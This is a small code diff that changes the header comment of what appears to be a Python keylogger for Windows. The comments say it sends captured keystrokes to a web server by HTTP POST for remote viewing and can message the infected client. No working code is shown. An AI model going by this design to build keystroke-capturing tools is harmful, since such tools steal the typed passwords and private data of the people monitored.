@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*- 
 
-#  A sample keyloger.
+#  A sample keyloger run in Windows.
 #  Using http "POST" method sending log data to the Web Server.
 #  So that you can get the log with any browser and any where.
 #  And add an function to send message to the client.
